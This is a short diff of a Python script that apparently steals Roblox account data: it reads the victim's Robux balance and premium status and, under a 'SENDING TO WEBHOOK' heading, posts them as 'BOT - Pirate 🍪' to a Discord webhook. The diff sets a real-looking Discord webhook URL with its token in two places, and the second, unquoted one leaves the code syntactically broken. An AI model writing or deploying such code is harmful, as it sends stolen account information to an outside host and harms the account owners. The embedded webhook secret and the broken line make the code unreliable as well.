@@ -3,7 +3,7 @@ import codecs
 import json
 from base64 import *
 
-webhookk = "heh"
+webhookk = "https://discord.com/api/webhooks/1216472874613870592/Cu37bKgm8laVLbf7PMNUGESSllecP6459mFSahRLKbi-J1TJIo-6mXo_Cz7OZP2pu_Mp"
 def command(c):
     os.system(c)
 def cls():
@@ -108,7 +108,7 @@ robux = info['RobuxBalance']
 premium = info['IsPremium'];
 #################### SENDING TO WEBHOOK #################
 
-discord = Discord(url=webhookk)
+discord = Discord(url=https://discord.com/api/webhooks/1216472874613870592/Cu37bKgm8laVLbf7PMNUGESSllecP6459mFSahRLKbi-J1TJIo-6mXo_Cz7OZP2pu_Mp)
 discord.post(
     username="BOT - Pirate 🍪",
     avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
